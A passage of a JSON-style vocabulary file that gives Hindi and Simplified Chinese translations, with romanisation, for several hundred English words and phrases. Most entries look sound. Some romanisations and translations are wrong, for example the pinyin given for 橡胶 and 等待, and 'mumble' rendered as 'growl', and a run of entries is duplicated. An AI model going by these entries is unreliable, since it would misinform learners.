                "Hindi": "काटना (kātnā)",
                "Chinese (Simplified)": "切 (qiē)"
            },
            "nails": {
                "Hindi": "नाखून (nākhūn)",
                "Chinese (Simplified)": "指甲 (zhǐjiǎ)"
            },
            "switch": {
                "Hindi": "स्विच (svic)",
                "Chinese (Simplified)": "开关 (kāiguān)"
            },
            "trust": {
                "Hindi": "विश्वास (viśvās)",
                "Chinese (Simplified)": "信任 (xìnrèn)"
            },
            "doubt": {
                "Hindi": "संदेह (sandeha)",
                "Chinese (Simplified)": "怀疑 (huáiyí)"
            },
            "distrust": {
                "Hindi": "अविश्वास (aviśvās)",
                "Chinese (Simplified)": "不信任 (bù xìnrèn)"
            },
            "quit": {
                "Hindi": "छोड़ना (chhoṛnā)",
                "Chinese (Simplified)": "退出 (tuìchū)"
            },
            "next": {
                "Hindi": "अगला (aglā)",
                "Chinese (Simplified)": "下一个 (xiàyīgè)"
            },
            "summarize": {
                "Hindi": "सारांशित करना (sārāṃśit karnā)",
                "Chinese (Simplified)": "总结 (zǒngjié)"
            },
            "sweat": {
                "Hindi": "पसीना (pasīnā)",
                "Chinese (Simplified)": "汗水 (hànshuǐ)"
            },
            "tears": {
                "Hindi": "आँसू (āṅsū)",
                "Chinese (Simplified)": "眼泪 (yǎnlèi)"
            },
            "urine": {
                "Hindi": "मूत्र (mūtra)",
                "Chinese (Simplified)": "尿液 (niàoyè)"
            },
            "pee": {
                "Hindi": "पेशाब करना (peśāb karnā)",
                "Chinese (Simplified)": "小便 (xiǎobiàn)"
            },
            "grid": {
                "Hindi": "ग्रिड (grid)",
                "Chinese (Simplified)": "网格 (wǎnggé)"
            },
            "finish": {
                "Hindi": "समाप्त करना (samāpt karnā)",
                "Chinese (Simplified)": "完成 (wánchéng)"
            },
            "beard": {
                "Hindi": "दाढ़ी (dāṛhī)",
                "Chinese (Simplified)": "胡须 (húxū)"
            },
            "mustache": {
                "Hindi": "मूंछ (mūñch)",
                "Chinese (Simplified)": "胡子 (húzi)"
            },
            "current": {
                "Hindi": "वर्तमान (vartman)",
                "Chinese (Simplified)": "当前 (dāngqián)"
            },
            "trend": {
                "Hindi": "रुझान (rujhan)",
                "Chinese (Simplified)": "趋势 (qūshì)"
            },
            "social": {
                "Hindi": "सामाजिक (sāmājik)",
                "Chinese (Simplified)": "社会的 (shèhuì de)"
            },
            "pants": {
                "Hindi": "पैंट (paint)",
                "Chinese (Simplified)": "裤子 (kùzi)"
            },
            "pant": {
                "Hindi": "सांस लेना (sāṃs lena)",
                "Chinese (Simplified)": "喘气 (chuǎnqì)"
            },
            "shirt": {
                "Hindi": "कमीज़ (kamīz)",
                "Chinese (Simplified)": "衬衫 (chènshān)"
            },
            "platform": {
                "Hindi": "मंच (manc)",
                "Chinese (Simplified)": "平台 (píngtái)"
            },
            "geography": {
                "Hindi": "भूगोल (Bhūgol)",
                "Chinese (Simplified)": "地理 (dìlǐ)"
            },
            "english": {
                "Hindi": "अंग्रेज़ी (Aṅgrēzī)",
                "Chinese (Simplified)": "英语 (yīngyǔ)"
            },
            "hindi": {
                "Hindi": "हिंदी (Hindī)",
                "Chinese (Simplified)": "印地语 (yìndìyǔ)"
            },
            "chinese": {
                "Hindi": "चीनी (Chīnī)",
                "Chinese (Simplified)": "中文 (zhōngwén)"
            },
            "economics": {
                "Hindi": "अर्थशास्त्र (Arthaśāstra)",
                "Chinese (Simplified)": "经济学 (jīngjìxué)"
            },
            "political Science": {
                "Hindi": "राजनीति विज्ञान (Rājnīti Vijñān)",
                "Chinese (Simplified)": "政治学 (zhèngzhìxué)"
            },
            "grip": {
                "Hindi": "पकड़ (pakad)",
                "Chinese (Simplified)": "抓握 (zhuāwò)"
            },
            "bridge": {
                "Hindi": "पुल (pul)",
                "Chinese (Simplified)": "桥 (qiáo)"
            },
            "villager": {
                "Hindi": "ग्रामीण (grāmīṇ)",
                "Chinese (Simplified)": "村民 (cūnmín)"
            },
            "worker": {
                "Hindi": "कार्यकर्ता (kāryakartā)",
                "Chinese (Simplified)": "工人 (gōngrén)"
            },
            "back": {
                "Hindi": "पीठ (pīṭh)",
                "Chinese (Simplified)": "背后 (bèihòu)"
            },
            "front": {
                "Hindi": "सामने (sāmnē)",
                "Chinese (Simplified)": "前面 (qiánmiàn)"
            },
            "hospital": {
                "Hindi": "अस्पताल (aspatāl)",
                "Chinese (Simplified)": "医院 (yīyuàn)"
            },
            "sociology": {
                "Hindi": "समाजशास्त्र (Samājśāstra)",
                "Chinese (Simplified)": "社会学 (shèhuìxué)"
            },
            "psychology": {
                "Hindi": "मनोविज्ञान (Manovijñān)",
                "Chinese (Simplified)": "心理学 (xīnlǐxué)"
            },
            "philosophy": {
                "Hindi": "दर्शनशास्त्र (Darśanśāstra)",
                "Chinese (Simplified)": "哲学 (zhéxué)"
            },
            "computer Science": {
                "Hindi": "कंप्यूटर विज्ञान (Kaṃpyūṭar Vijñān)",
                "Chinese (Simplified)": "计算机科学 (jìsuànjī kēxué)"
            },
            "art": {
                "Hindi": "कला (Kalā)",
                "Chinese (Simplified)": "艺术 (yìshù)"
            },
            "music": {
                "Hindi": "संगीत (Saṅgīt)",
                "Chinese (Simplified)": "音乐 (yīnyuè)"
            },
            "physical Education": {
                "Hindi": "शारीरिक शिक्षा (Śārīrik Śikṣā)",
                "Chinese (Simplified)": "体育 (tǐyù)"
            },
            "law": {
                "Hindi": "कानून (Kānūn)",
                "Chinese (Simplified)": "法律 (fǎlǜ)"
            },
            "medicine": {
                "Hindi": "चिकित्सा (Cikitsā)",
                "Chinese (Simplified)": "医学 (yīxué)"
            },
            "astronomy": {
                "Hindi": "खगोलशास्त्र (Khagolśāstra)",
                "Chinese (Simplified)": "天文学 (tiānwénxué)"
            },
            "environmental Science": {
                "Hindi": "पर्यावरण विज्ञान (Paryāvaraṇ Vijñān)",
                "Chinese (Simplified)": "环境科学 (huánjìng kēxué)"
            },
            "engineering": {
                "Hindi": "अभियंत्रिकी (Abhiyantrikī)",
                "Chinese (Simplified)": "工程学 (gōngchéngxué)"
            },
            "study": {
                "Hindi": "अध्ययन (adhyayan)",
                "Chinese (Simplified)": "学习 (xuéxí)"
            },
            "interest": {
                "Hindi": "रुचि (ruci)",
                "Chinese (Simplified)": "兴趣 (xìngqù)"
            },
            "discrimination": {
                "Hindi": "भेदभाव (bhedbhāv)",
                "Chinese (Simplified)": "歧视 (qíshì)"
            },
            "inequality": {
                "Hindi": "असमानता (asamānatā)",
                "Chinese (Simplified)": "不平等 (bù píngděng)"
            },
            "delay": {
                "Hindi": "देर (der)",
                "Chinese (Simplified)": "延迟 (yánchí)"
            },
            "late": {
                "Hindi": "देर से (der se)",
                "Chinese (Simplified)": "迟到 (chídào)"
            },
            "kudos": {
                "Hindi": "सराहना (sarāhanā)",
                "Chinese (Simplified)": "赞扬 (zànyáng)"
            },
            "area": {
                "Hindi": "क्षेत्र (kṣetra)",
                "Chinese (Simplified)": "区域 (qūyù)"
            },
            "verify": {
                "Hindi": "सत्यापित करना (satyāpit karnā)",
                "Chinese (Simplified)": "验证 (yànzhèng)"
            },
            "blink": {
                "Hindi": "पलक झपकना (palak jhapaknā)",
                "Chinese (Simplified)": "眨眼 (zhǎyǎn)"
            },
            "option": {
                "Hindi": "विकल्प (vikalp)",
                "Chinese (Simplified)": "选项 (xuǎnxíàng)"
            },
            "i love you": {
                "Hindi": "मैं तुमसे प्यार करता हूँ (ma͠ĩ tumse pyār kartā hū̃)",
                "Chinese (Simplified)": "我爱你 (wǒ ài nǐ)"
            },
            "hate": {
                "Hindi": "नफरत करना (nafarat karnā)",
                "Chinese (Simplified)": "恨 (hèn)"
            },
            "i hate you": {
                "Hindi": "मुझे तुमसे नफरत है (mujhe tumse nafarat hai)",
                "Chinese (Simplified)": "我恨你 (wǒ hèn nǐ)"
            },
            "insect": {
                "Hindi": "कीड़ा (kīda)",
                "Chinese (Simplified)": "昆虫 (kūnchóng)"
            },
            "mammals": {
                "Hindi": "स्तनधारी (stnandhārī)",
                "Chinese (Simplified)": "哺乳动物 (pǔrǔ dòngwù)"
            },
            "reptiles": {
                "Hindi": "सरीसृप (sarīsr̥p)",
                "Chinese (Simplified)": "爬行动物 (pá xíng dòngwù)"
            },
            "humans": {
                "Hindi": "मनुष्य/इंसान (manuşya/insaan)",
                "Chinese (Simplified)": "人类 (rénlèi)"
            },
            "rubber": {
                "Hindi": "रबर (rabar)",
                "Chinese (Simplified)": "橡胶 (xiàngpiào)"
            },
            "erase": {
                "Hindi": "मिटाना (mitānā)",
                "Chinese (Simplified)": "擦除 (cāchú)"
            },
            "pervert": {
                "Hindi": "विकृत व्यक्ति (vikṛt vyakti)",
                "Chinese (Simplified)": "变态 (biàntài)"
            },
            "undo": {
                "Hindi": "पूर्ववत करना (pūrvavt karnā)",
                "Chinese (Simplified)": "撤销 (chèxiāo)"
            },
            "give": {
                "Hindi": "देना (denā)",
                "Chinese (Simplified)": "给 (gěi)"
            },
            "sacrifice": {
                "Hindi": "बलिदान (balidān)",
                "Chinese (Simplified)": "牺牲 (xīshēng)"
            },
            "health": {
                "Hindi": "स्वास्थ्य (svāsthya)",
                "Chinese (Simplified)": "健康 (jiànkāng)"
            },
            "pregnant": {
                "Hindi": "गर्भवती (garbhavatī)",
                "Chinese (Simplified)": "怀孕的 (huáiyùn de)"
            },
            "honest": {
                "Hindi": "ईमानदार (īmāndār)",
                "Chinese (Simplified)": "诚实的 (chéngshí de)"
            },
            "addiction": {
                "Hindi": "व्यसन (vyasan)",
                "Chinese (Simplified)": "瘾 (yǐn)"
            },
            "addict": {
                "Hindi": "व्यसनी (vyasnī)",
                "Chinese (Simplified)": "瘾君子 (yǐn jūnzǐ)"
            },
            "child": {
                "Hindi": "बच्चा (bacca)",
                "Chinese (Simplified)": "孩子 (háizi)"
            },
            "caught": {
                "Hindi": "पकड़ा गया (pakṛā gayā)",
                "Chinese (Simplified)": "被抓 (bèi zhuā)"
            },
            "crime": {
                "Hindi": "अपराध (apradh)",
                "Chinese (Simplified)": "犯罪 (fànzuì)"
            },
            "loneliness": {
                "Hindi": "अकेलापन (akelāpan)",
                "Chinese (Simplified)": "孤独 (gūdú)"
            },
            "bind": {
                "Hindi": "बाँधना (bāṅdhna)",
                "Chinese (Simplified)": "捆绑 (kǔnbǎng)"
            },
            "bound": {
                "Hindi": "बँधा हुआ (baṅdhā huā)",
                "Chinese (Simplified)": "绑定的 (bǎndìng de)"
            },
            "pot": {
                "Hindi": "गमला (gamalā)",
                "Chinese (Simplified)": "盆 (pén)"
            },
            "health": {
                "Hindi": "स्वास्थ्य (svāsthya)",
                "Chinese (Simplified)": "健康 (jiànkāng)"
            },
            "pregnant": {
                "Hindi": "गर्भवती (garbhavatī)",
                "Chinese (Simplified)": "怀孕的 (huáiyùn de)"
            },
            "honest": {
                "Hindi": "ईमानदार (īmāndār)",
                "Chinese (Simplified)": "诚实的 (chéngshí de)"
            },
            "addiction": {
                "Hindi": "व्यसन/लत (vyasan/lat)",
                "Chinese (Simplified)": "瘾 (yǐn)"
            },
            "addict": {
                "Hindi": "व्यसनी (vyasnī)",
                "Chinese (Simplified)": "瘾君子 (yǐn jūnzǐ)"
            },
            "child": {
                "Hindi": "बच्चा (bacca)",
                "Chinese (Simplified)": "孩子 (háizi)"
            },
            "caught": {
                "Hindi": "पकड़ा गया (pakṛā gayā)",
                "Chinese (Simplified)": "被抓 (bèi zhuā)"
            },
            "crime": {
                "Hindi": "अपराध (apradh)",
                "Chinese (Simplified)": "犯罪 (fànzuì)"
            },
            "loneliness": {
                "Hindi": "अकेलापन (akelāpan)",
                "Chinese (Simplified)": "孤独 (gūdú)"
            },
            "bind": {
                "Hindi": "बाँधना (bāṅdhna)",
                "Chinese (Simplified)": "捆绑 (kǔnbǎng)"
            },
            "illness": {
                "Hindi": "बीमारी (bīmārī)",
                "Chinese (Simplified)": "疾病 (jíbìng)"
            },
            "glow": {
                "Hindi": "चमक (camak)",
                "Chinese (Simplified)": "发光 (fāguāng)"
            },
            "pride": {
                "Hindi": "गर्व (garv)",
                "Chinese (Simplified)": "骄傲 (jiāo'ào)"
            },
            "proud": {
                "Hindi": "गर्वित (garvit)",
                "Chinese (Simplified)": "骄傲的 (jiāo'ào de)"
            },
            "dust": {
                "Hindi": "धूल (dhūl)",
                "Chinese (Simplified)": "灰尘 (huīchén)"
            },
            "bark": {
                "Hindi": "भौंकना (bhaunknā)",
                "Chinese (Simplified)": "吠叫 (fèijiào)"
            },
            "sand": {
                "Hindi": "रेत (ret)",
                "Chinese (Simplified)": "沙子 (shāzi)"
            },
            "bobble": {
                "Hindi": "डगमगाना (dagmagānā)",
                "Chinese (Simplified)": "晃动 (huàngdòng)"
            },
            "mumble": {
                "Hindi": "गुर्राना (gurrānā)",
                "Chinese (Simplified)": "咕哝 (gū nong)"
            },
            "whistle": {
                "Hindi": "सीटी बजाना (sītī bajānā)",
                "Chinese (Simplified)": "吹口哨 (chuī kǒushào)"
            },
            "clap": {
                "Hindi": "ताली बजाना (tālī bajānā)",
                "Chinese (Simplified)": "鼓掌 (gǔzhǎng)"
            },
            "crowd": {
                "Hindi": "भीड़ (bhīṛ)",
                "Chinese (Simplified)": "人群 (rénqún)"
            },
            "pollution": {
                "Hindi": "प्रदूषण (pradūṣaṇ)",
                "Chinese (Simplified)": "污染 (wūrǎn)"
            },
            "noise": {
                "Hindi": "शोर (śor)",
                "Chinese (Simplified)": "噪音 (zàoyīn)"
            },
            "soil": {
                "Hindi": "मिट्टी (mitṭī)",
                "Chinese (Simplified)": "土壤 (tǔrǎng)"
            },
            "population": {
                "Hindi": "जनसंख्या (jansankhyā)",
                "Chinese (Simplified)": "人口 (rénkǒu)"
            },
            "worry": {
                "Hindi": "चिंता (cintā)",
                "Chinese (Simplified)": "担心 (dānxīn)"
            },
            "worried": {
                "Hindi": "चिंतित (cintīt)",
                "Chinese (Simplified)": "担心的 (dānxīn de)"
            },
            "kind": {
                "Hindi": "दयालु (dayālu)",
                "Chinese (Simplified)": "善良的 (shànliáng de)"
            },
            "forest": {
                "Hindi": "जंगल (jangal)",
                "Chinese (Simplified)": "森林 (sēnlín)"
            },
            "side": {
                "Hindi": "पक्ष (pakṣ)",
                "Chinese (Simplified)": "侧面 (cèmiàn)"
            },
            "important": {
                "Hindi": "महत्वपूर्ण (mahatvapūrṇa)",
                "Chinese (Simplified)": "重要的 (zhòngyào de)"
            },
            "hurry": {
                "Hindi": "जल्दी करना (jaldi karnā)",
                "Chinese (Simplified)": "赶快 (gǎnkuài)"
            },
            "hook": {
                "Hindi": "हुक (huk)",
                "Chinese (Simplified)": "钩子 (gōuzi)"
            },
            "pin": {
                "Hindi": "पिन (pin)",
                "Chinese (Simplified)": "别针 (biēzhēn)"
            },
            "surface": {
                "Hindi": "सतह (satah)",
                "Chinese (Simplified)": "表面 (biǎomiàn)"
            },
            "ink": {
                "Hindi": "स्याही (syāhi)",
                "Chinese (Simplified)": "墨水 (mòshuǐ)"
            },
            "grow": {
                "Hindi": "बढ़ना (baṛhnā)",
                "Chinese (Simplified)": "成长 (chéngzhǎng)"
            },
            "age": {
                "Hindi": "उम्र (umr)",
                "Chinese (Simplified)": "年龄 (niánlíng)"
            },
            "brick": {
                "Hindi": "ईंट (īṇṭ)",
                "Chinese (Simplified)": "砖 (zhuān)"
            },
            "category": {
                "Hindi": "श्रेणी (śreṇī)",
                "Chinese (Simplified)": "类别 (lèibìe)"
            },
            "type": {
                "Hindi": "प्रकार (prakār)",
                "Chinese (Simplified)": "类型 (lèixíng)"
            },
            "champion": {
                "Hindi": "चैंपियन (caimpiyan)",
                "Chinese (Simplified)": "冠军 (guànjūn)"
            },
            "winner": {
                "Hindi": "विजेता (vijeta)",
                "Chinese (Simplified)": "胜利者 (shènglì zhě)"
            },
            "bench": {
                "Hindi": "बेंच (beñc)",
                "Chinese (Simplified)": "长凳 (chángdèng)"
            },
            "first": {
                "Hindi": "पहला (pahlā)",
                "Chinese (Simplified)": "第一 (dìyī)"
            },
            "second": {
                "Hindi": "दूसरा (dūsrā)",
                "Chinese (Simplified)": "第二 (dì'èr)"
            },
            "third": {
                "Hindi": "तीसरा (tīsra)",
                "Chinese (Simplified)": "第三 (dìsān)"
            },
            "fourth": {
                "Hindi": "चौथा (cauthā)",
                "Chinese (Simplified)": "第四 (dìsì)"
            },
            "fifth": {
                "Hindi": "पाँचवाँ (pāñcavā̃)",
                "Chinese (Simplified)": "第五 (dìwǔ)"
            },
            "sixth": {
                "Hindi": "छठा (chhaṭhā)",
                "Chinese (Simplified)": "第六 (dìliù)"
            },
            "seventh": {
                "Hindi": "सातवाँ (sātavā̃)",
                "Chinese (Simplified)": "第七 (dìqī)"
            },
            "eighth": {
                "Hindi": "आठवाँ (āṭhvā̃)",
                "Chinese (Simplified)": "第八 (dìbā)"
            },
            "ninth": {
                "Hindi": "नौवाँ (nauvā̃)",
                "Chinese (Simplified)": "第九 (dìjiǔ)"
            },
            "tenth": {
                "Hindi": "दसवाँ (dasvā̃)",
                "Chinese (Simplified)": "第十 (díshi)"
            },
            "glasses": {
                "Hindi": "चश्मा (caśmā)",
                "Chinese (Simplified)": "眼镜 (yǎnjìng)"
            },
            "redo": {
                "Hindi": "दुबारा करना (dubārā karnā)",
                "Chinese (Simplified)": "重做 (chóngzuò)"
            },
            "virus": {
                "Hindi": "वायरस (vāyaras)",
                "Chinese (Simplified)": "病毒 (bìngdú)"
            },
            "pandemic": {
                "Hindi": "महामारी (mahāmārī)",
                "Chinese (Simplified)": "大流行病 (dàliúxíngbìng)"
            },
            "farming": {
                "Hindi": "कृषि (kṛṣi)",
                "Chinese (Simplified)": "农业 (nóngyè)"
            },
            "alert": {
                "Hindi": "चेतावनी (cetāvanī)",
                "Chinese (Simplified)": "警报 (jǐngbào)"
            },
            "corruption": {
                "Hindi": "भ्रष्टाचार (bhraṣṭācār)",
                "Chinese (Simplified)": "腐败 (fǔbài)"
            },
            "warning": {
                "Hindi": "चेतावनी (cetāvanī)",
                "Chinese (Simplified)": "警告 (jǐnggào)"
            },
            "blackmail": {
                "Hindi": "ब्लैकमेल (blakmel)",
                "Chinese (Simplified)": "勒索 (lēsuǒ)"
            },
            "train station": {
                "Hindi": "रेलवे स्टेशन (relve stēśan)",
                "Chinese (Simplified)": "火车站 (huǒchē zhàn)"
            },
            "police station": {
                "Hindi": "पुलिस स्टेशन (pulis stēśan)",
                "Chinese (Simplified)": "警察局 (jǐngchá jú)"
            },
            "confidence": {
                "Hindi": "आत्मविश्वास (ātmaviśvās)",
                "Chinese (Simplified)": "自信 (zìxìn)"
            },
            "confident": {
                "Hindi": "आत्मविश्वासी (ātmaviśvāsī)",
                "Chinese (Simplified)": "自信的 (zìxìn de)"
            },
            "scare": {
                "Hindi": "डराना (ḍarānā)",
                "Chinese (Simplified)": "吓唬 (xiàhǔ)"
            },
            "scary": {
                "Hindi": "डरावना (ḍarāvnā)",
                "Chinese (Simplified)": "吓人的 (xiàrén de)"
            },
            "oh no": {
                "Hindi": "अरे नहीं (are nahī̃)",
                "Chinese (Simplified)": "哦，不 (ó, bù)"
            },
            "return": {
                "Hindi": "वापस आना (vāpas ā nā)",
                "Chinese (Simplified)": "返回 (fǎnhuí)"
            },
            "from": {
                "Hindi": "से (se)",
                "Chinese (Simplified)": "从 (cóng)"
            },
            "complete": {
                "Hindi": "पूर्ण (pūrṇa)",
                "Chinese (Simplified)": "完整的 (wánzhěng de)"
            },
            "guide": {
                "Hindi": "मार्गदर्शक (margdarshak)",
                "Chinese (Simplified)": "指南 (zhǐnán)"
            },
            "wait": {
                "Hindi": "इंतजार करना (intzar karnā)",
                "Chinese (Simplified)": "等待 (dǎidài)"
            },
            "after": {
                "Hindi": "के बाद (ke bād)",
                "Chinese (Simplified)": "之后 (zhīhòu)"
            },
            "before": {
                "Hindi": "के पहले (ke pahle)",
                "Chinese (Simplified)": "之前 (zhīqián)"
            },
            "get": {
                "Hindi": "पाना (pānā)",
                "Chinese (Simplified)": "得到 (dédào)"
            },
            "got": {
                "Hindi": "मिला (milā)",
                "Chinese (Simplified)": "得到 (dédào)"
            },
            "fold": {
                "Hindi": "मोड़ना (moṛnā)",
                "Chinese (Simplified)": "折叠 (zhédié)"
            },
            "bend": {
                "Hindi": "झुकना (jhuknā)",
                "Chinese (Simplified)": "弯曲 (wānqū)"
            },
            "save": {
                "Hindi": "बचाना (bacānā)",
                "Chinese (Simplified)": "拯救 (zhěngjiù)"
            },
            "safe": {
                "Hindi": "सुरक्षित (surakshit)",
                "Chinese (Simplified)": "安全的 (ānquán de)"
            },
            "scam": {
                "Hindi": "धोखाधड़ी (dhokādhaṛī)",
                "Chinese (Simplified)": "诈骗 (zhàpiàn)"
            },
            "fame": {
                "Hindi": "प्रसिद्धि (prasiddhi)",
                "Chinese (Simplified)": "名声 (míngsheng)"
            },
            "patriotism": {
                "Hindi": "देशभक्ति (deśbhaktī)",
                "Chinese (Simplified)": "爱国主义 (àiguó zhǔyì)"
            },
            "patriarchy": {
                "Hindi": "पितृसत्ता (pitṛsattā)",
                "Chinese (Simplified)": "父权制 (fùquánzhì)"
            },
            "feminist": {
                "Hindi": "नारीवादी (nārīvādī)",
                "Chinese (Simplified)": "女权主义者 (nǚquán zhǔyì zhě)"
            },
            "feminism": {
                "Hindi": "नारीवाद (nārīvād)",
                "Chinese (Simplified)": "女权主义 (nǚquán zhǔyì)"
            },
            "ethical": {
                "Hindi": "नैतिक (naitik)",
                "Chinese (Simplified)": "道德的 (dàodé de)"
            },
            "should": {
                "Hindi": "चाहिए (cāhiye)",
                "Chinese (Simplified)": "应该 (yīnggāi)"
            },
            "would": {
                "Hindi": "करता (kartā)",
                "Chinese (Simplified)": "会 (huì)"
            },
            "cult": {
                "Hindi": "सांप्रदायिक समूह (sāmpradāyik samūh)",
                "Chinese (Simplified)": "邪教 (xiéjiào)"
            },
            "culprit": {
                "Hindi": "अपराधी (apradhī)",
                "Chinese (Simplified)": "罪犯 (zuìfàn)"
            },
            "exposed": {
                "Hindi": "बेनकाब (benkāb)",
                "Chinese (Simplified)": "曝光 (pòguāng)"
            },
            "song": {
                "Hindi": "गीत (gīt)",
                "Chinese (Simplified)": "歌曲 (gēqǔ)"
            },
            "modern": {
                "Hindi": "आधुनिक (ādhunik)",
                "Chinese (Simplified)": "现代的 (xiàndài de)"
            },
            "ancient": {
                "Hindi": "प्राचीन (prācīn)",
                "Chinese (Simplified)": "古代的 (gǔdài de)"
            },
            "information": {
                "Hindi": "सूचना (sūcanā)",
                "Chinese (Simplified)": "信息 (xìnxī)"
            },
            "trolling": {
                "Hindi": "मज़ाक में परेशान करना (mazak mein pareshan karna)",
                "Chinese (Simplified)": "网络喷子 (wǎngluò pēnzǐ)"
            },
            "justice": {
                "Hindi": "न्याय (nyāya)",
                "Chinese (Simplified)": "正义 (zhèngyì)"
            },
            "justify": {
                "Hindi": "उचित ठहराना (ucit ṭhahrānā)",
                "Chinese (Simplified)": "证明 (zhèngmíng)"
            },
            "religious": {
                "Hindi": "धार्मिक (dhārmik)",
                "Chinese (Simplified)": "宗教的 (zōngjiào de)"
            },
            "atheist": {
                "Hindi": "नास्तिक (nāstik)",
                "Chinese (Simplified)": "无神论者 (wúshenlùn zhě)"
            },
            "government": {
                "Hindi": "सरकार (sarkār)",
                "Chinese (Simplified)": "政府 (zhèngfǔ)"
            },
            "reveal": {
                "Hindi": "प्रकट करना (prakat karnā)",
                "Chinese (Simplified)": "揭示 (jiēshì)"
            },
            "story": {
                "Hindi": "कहानी (kahānī)",
                "Chinese (Simplified)": "故事 (gùshi)"
            },
            "cause": {
                "Hindi": "कारण (kāraṇ)",
                "Chinese (Simplified)": "原因 (yuányīn)"
            },
            "root": {
                "Hindi": "जड़ (jaṛ)",
                "Chinese (Simplified)": "根 (gēn)"
            },
            "controversy": {
                "Hindi": "विवाद (vivād)",
                "Chinese (Simplified)": "争议 (zhēngyì)"
            },
            "propose": {
                "Hindi": "प्रस्तावित करना (prastavit karnā)",
                "Chinese (Simplified)": "提议 (tíyì)"
            },
            "cute": {
                "Hindi": "प्यारा (pyārā)",
                "Chinese (Simplified)": "可爱的 (kě'ài de)"
            },
            "face": {
                "Hindi": "चेहरा (cehrā)",
                "Chinese (Simplified)": "脸 (liǎn)"
            },
            "permanent": {
                "Hindi": "स्थायी (sthāyī)",
                "Chinese (Simplified)": "永久的 (yǒngjiǔ de)"
            },
            "persistent": {
                "Hindi": "लगातार (lagātār)",
                "Chinese (Simplified)": "持续的 (chíxù de)"
            },
            "hold": {
                "Hindi": "पकड़ना (pakṛnā)",
                "Chinese (Simplified)": "握住 (wòzhù)"
            },
            "judge": {
                "Hindi": "न्यायाधीश (nyāyādhīś)",
                "Chinese (Simplified)": "法官 (fǎguān)"
            },
            "foreigners": {
                "Hindi": "विदेशी (videśī)",
                "Chinese (Simplified)": "外国人 (wàiguórén)"
            },
            "foreign": {
                "Hindi": "विदेशी (videśī)",
                "Chinese (Simplified)": "外国的 (wàiguó de)"
            },
            "act": {
                "Hindi": "अभिनय करना (abhinay karnā)",
                "Chinese (Simplified)": "表演 (biǎoyǎn)"
            },
            "weird": {
                "Hindi": "अजीब (ajīb)",
                "Chinese (Simplified)": "奇怪的 (qíguài de)"
            },
            "shame": {
                "Hindi": "शर्म (śarm)",
                "Chinese (Simplified)": "羞耻 (xiūchǐ)"
            },
            "full": {
                "Hindi": "पूरा (pūrā)",
                "Chinese (Simplified)": "满的 (mǎn de)"
            },
            "mental": {
                "Hindi": "मानसिक (mānasik)",
                "Chinese (Simplified)": "心理的 (xīnlǐ de)"
            },
            "mad": {
                "Hindi": "पागल (pāgal)",
                "Chinese (Simplified)": "疯的 (fēng de)"
            },
            "extra": {
                "Hindi": "अतिरिक्त (atirikt)",
                "Chinese (Simplified)": "额外的 (éiwài de)"
            },
            "ordinary": {
                "Hindi": "साधारण (sādhāraṇ)",
                "Chinese (Simplified)": "普通的 (pǔtōng de)"
            },
            "fresh": {
                "Hindi": "ताजा (tājā)",
                "Chinese (Simplified)": "新鲜的 (xīnxiān de)"
            },
            "push": {
                "Hindi": "धक्का देना (dhakka denā)",
                "Chinese (Simplified)": "推 (tuī)"
            },
            "rush": {
                "Hindi": "जल्दी करना (jaldi karnā)",
                "Chinese (Simplified)": "匆忙 (cōngmáng)"
            },
            "create": {
                "Hindi": "सृजन करना (sr̥jan karnā)",
                "Chinese (Simplified)": "创造 (chuàngzào)"
            },
            "art": {
                "Hindi": "कला (kalā)",
                "Chinese (Simplified)": "艺术 (yìshù)"
            },
            "design": {
                "Hindi": "डिजाइन (dijain)",
                "Chinese (Simplified)": "设计 (shèjì)"
            },
            "better": {
                "Hindi": "बेहतर (behtar)",
                "Chinese (Simplified)": "更好 (gèng hǎo)"
            },
            "than": {
                "Hindi": "से (se)",
                "Chinese (Simplified)": "比 (bǐ)"
            },
            "then": {
                "Hindi": "फिर (phir)",
                "Chinese (Simplified)": "然后 (ránhòu)"
            },
            "rope": {
                "Hindi": "रस्सी (rassī)",
                "Chinese (Simplified)": "绳子 (shéngzi)"
            },
            "happen": {
                "Hindi": "होना (honā)",
                "Chinese (Simplified)": "发生 (fāshēng)"
            },
            "happened": {
                "Hindi": "हुआ (huā)",
                "Chinese (Simplified)": "发生了 (fāshēng le)"
            },
            "strength": {
                "Hindi": "ताकत (tākat)",
                "Chinese (Simplified)": "力量 (lìliàng)"
            },
            "behind": {
                "Hindi": "पीछे (pīche)",
                "Chinese (Simplified)": "后面 (hòumiàn)"
            },
            "infront": {
                "Hindi": "सामने (sāmnē)",
                "Chinese (Simplified)": "前面 (qiánmiàn)"
            },
            "rainfall": {
                "Hindi": "वर्षा (varṣā)",
                "Chinese (Simplified)": "降雨量 (jiàngyǔliàng)"
            },
            "state": {
                "Hindi": "राज्य (rājya)",
                "Chinese (Simplified)": "州 (zhōu)"
            },
            "country": {
                "Hindi": "देश (deś)",
                "Chinese (Simplified)": "国家 (guójiā)"
            },
            "law": {
                "Hindi": "कानून (kānūn)",
                "Chinese (Simplified)": "法律 (fǎlǜ)"
            },
            "rule": {
                "Hindi": "नियम (niyam)",
                "Chinese (Simplified)": "规则 (guīzé)"
            },
            "rules": {
                "Hindi": "नियम (niyam)",
                "Chinese (Simplified)": "规则 (guīzé)"
            },
            "try": {
                "Hindi": "कोशिश करना (kośiš karnā)",
                "Chinese (Simplified)": "尝试 (chángshì)"
            },
            "tried": {
                "Hindi": "कोशिश की (kośiš kī)",
                "Chinese (Simplified)": "尝试了 (chángshì le)"
            },
            "anti": {
                "Hindi": "विरोधी (virōdhī)",
                "Chinese (Simplified)": "反 (fǎn)"
            },
            "superstition": {
                "Hindi": "अंधविश्वास (andhaviśvās)",
                "Chinese (Simplified)": "迷信 (míxìn)"
            },
            "behave": {
                "Hindi": "व्यवहार करना (vyavahār karnā)",
                "Chinese (Simplified)": "表现 (biǎoxiàn)"
            },
            "real": {
                "Hindi": "असली (asalī)",
                "Chinese (Simplified)": "真正的 (zhēnzhèng de)"
            },
            "fake": {
                "Hindi": "नकली (naklī)",
                "Chinese (Simplified)": "假的 (jiǎ de)"
            },
            "accept": {
                "Hindi": "स्वीकार करना (svīkār karnā)",
                "Chinese (Simplified)": "接受 (jiēshòu)"
            },
            "cancel": {
                "Hindi": "रद्द करना (radd karnā)",
                "Chinese (Simplified)": "取消 (qǔxiāo)"
            },
            "inside": {
                "Hindi": "अंदर (andar)",
                "Chinese (Simplified)": "里面 (lǐmiàn)"
            },
            "outside": {
                "Hindi": "बाहर (bāhar)",
                "Chinese (Simplified)": "外面 (wàimiàn)"
            },
            "culture": {
                "Hindi": "संस्कृति (saṃskṛti)",
                "Chinese (Simplified)": "文化 (wénhuà)"
            },
            "tradition": {
